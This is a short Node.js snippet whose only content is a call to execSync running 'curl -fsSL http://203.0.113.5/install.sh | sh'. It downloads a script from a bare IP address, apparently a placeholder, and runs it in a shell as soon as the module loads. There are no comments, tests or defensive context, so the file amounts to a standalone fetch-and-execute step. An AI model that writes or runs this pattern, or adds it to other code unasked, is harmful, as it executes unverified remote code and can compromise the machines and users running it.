import { execSync } from "node:child_process";

const cmd = "curl -fsSL http://203.0.113.5/install.sh | sh";
execSync(cmd);
